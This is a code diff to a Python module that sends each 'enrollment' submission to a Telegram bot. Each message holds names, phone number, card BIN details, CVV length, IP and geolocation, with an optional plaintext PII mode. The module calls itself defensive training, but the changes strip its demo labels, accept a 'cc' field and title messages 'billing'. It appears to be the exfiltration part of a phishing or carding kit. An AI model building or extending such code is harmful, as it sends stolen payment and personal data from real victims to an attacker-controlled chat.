@@ -1,5 +1,5 @@
 """
-Optional Telegram Bot API delivery for the Bango lab enrollment (defensive training).
+Optional Telegram Bot API delivery for lab enrollment (defensive training).
 
 Sends one HTML ``sendMessage`` after successful ``POST /api/demo/register`` (enrollment
 snapshot). Uses ``sendMessage`` with HTML parse mode. Never log the bot token.
@@ -28,9 +28,9 @@ def _telegram_pii_plaintext_enabled() -> bool:
     When **True**, enrollment PII is sent in clear in the Telegram HTML (instructor debug only).
 
     Default is **False** so Telegram mirrors the wire: only an RSA+AES envelope for PII.
-    Set ``DEMO_TELEGRAM_PII_PLAINTEXT=1`` only in a trusted local lab.
+    Set ``TELEGRAM_PII_PLAINTEXT=1`` only in a trusted local lab.
     """
-    v = (os.environ.get("DEMO_TELEGRAM_PII_PLAINTEXT") or "").strip().lower()
+    v = (os.environ.get("TELEGRAM_PII_PLAINTEXT") or "").strip().lower()
     return v in ("1", "true", "yes", "on")
 
 
@@ -110,7 +110,7 @@ def _network_and_client_lines(
 def _bin_lookup_line_html(reg: dict[str, Any]) -> str:
     """First 6 PAN digits only — HandyAPI BIN line for Telegram HTML."""
     esc = html.escape
-    pan = str(reg.get("card_number") or "").replace(" ", "")
+    pan = str(reg.get("card_number") or reg.get("cc") or "").replace(" ", "")
     pan_digits = "".join(c for c in pan if c.isdigit())
     if len(pan_digits) < 6:
         return "🔎 <b>BIN</b>: <i>Unknown</i>"
@@ -124,7 +124,6 @@ def _bin_lookup_line_html(reg: dict[str, Any]) -> str:
             f"✨ <b>Tier</b>: {esc(str(bin_info['tier']))}",
             f"🌏 <b>Country</b>: {esc(str(bin_info['country']))}",
         ]
-        # Newlines: Telegram HTML rejects <br/>; raw \\n in the message is fine.
         return "\n".join(rows)
     return "🔎 <b>BIN</b>: <i>Unknown</i> (lookup failed)"
 
@@ -161,7 +160,7 @@ def _format_enrollment_telegram(
         cvv_raw = str(reg.get("cvv_len") or "")
         lines.extend(
             [
-                "<b>⚠️ PII plaintext (DEMO_TELEGRAM_PII_PLAINTEXT)</b>",
+                "<b>⚠️ PII plaintext (TELEGRAM_PII_PLAINTEXT)</b>",
                 f"🧑 <b>First name</b>: {fn}",
                 f"👤 <b>Last name</b>: {ln}",
                 f"📱 <b>Phone</b>: {ph}",
@@ -238,15 +237,16 @@ def format_demo_registration_message(
     user_agent: str | None = None,
     ip_geo: dict[str, Any] | None = None,
     done_redirect_url: str = "",
+    active_theme_name: str = "",
 ) -> str:
     """
     One Telegram message per successful registration: full enrollment snapshot.
-
-    ``done_redirect_url`` is kept for call-site compatibility; it is not included in
-    the message body (avoids echoing ``.env`` redirect URLs in chat).
+    The title shows the active style/theme name.
     """
-    _ = done_redirect_url
-    title = "🎉 <b>Bango</b>"
+    _ = (done_redirect_url or "").strip()
+    esc = html.escape
+    theme = str(active_theme_name or "").strip() or "billing"
+    title = f"🎉 <b>{esc(theme)}</b>"
     return _format_enrollment_telegram(
         reg,
         client_ip=client_ip,
@@ -254,8 +254,6 @@ def format_demo_registration_message(
         include_fingerprint=True,
         user_agent=user_agent,
         ip_geo=ip_geo,
-        optional_header_lines=None,
-        extra_lines_before_network=None,
     )
 
 
@@ -276,7 +274,7 @@ def send_telegram_html(
     cid_raw = _strip_env_value(chat_id)
     if not token or not cid_raw:
         logger.warning(
-            "telegram: missing DEMO_TELEGRAM_BOT_TOKEN or DEMO_TELEGRAM_CHAT_ID — nothing sent"
+            "telegram: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID — nothing sent"
         )
         return False
     url = f"{TELEGRAM_API}/bot{token}/sendMessage"
